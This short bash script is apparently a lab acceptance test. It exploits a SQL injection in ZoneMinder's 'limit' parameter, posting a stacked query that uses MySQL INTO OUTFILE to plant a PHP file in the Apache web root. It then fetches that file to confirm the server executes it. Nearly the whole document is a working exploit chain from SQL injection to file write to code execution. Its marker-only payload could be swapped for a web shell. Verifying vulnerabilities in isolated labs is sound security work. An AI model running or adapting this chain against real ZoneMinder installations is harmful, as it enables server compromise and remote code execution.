#!/usr/bin/env bash
# Run only inside an ephemeral isolated lab instance.
set -euo pipefail
marker="pebbles-sqli-acceptance-$(date +%s)-$$"
filepath="/var/www/html/${marker}.php"
trap 'rm -f "$filepath"' EXIT
payload="100;SELECT '<?php echo \"SQLI_OUTFILE_CONFIRMED\"; ?>' INTO OUTFILE '${filepath}'#"
curl --silent --show-error --max-time 25 \
    --data-urlencode 'view=request' \
    --data-urlencode 'request=log' \
    --data-urlencode 'task=query' \
    --data-urlencode "limit=${payload}" \
    'http://127.0.0.1:3305/zm/index.php' >/tmp/pebbles-sqli-response.txt || true
if [[ ! -f "$filepath" ]]; then
    echo 'FAIL: original ZoneMinder limit injection did not write through MySQL' >&2
    echo 'Inspect PDO, MySQL privileges and Apache; do NOT simulate the endpoint.' >&2
    exit 1
fi
body=$(curl --fail --silent --show-error --max-time 8 "http://127.0.0.1:3305/${marker}.php")
[[ "$body" == SQLI_OUTFILE_CONFIRMED ]] || {
    echo 'FAIL: SQL-created PHP did not execute in Apache' >&2
    exit 1
}
echo 'PASS: genuine ZoneMinder SQLi -> MySQL INTO OUTFILE -> Apache PHP execution'
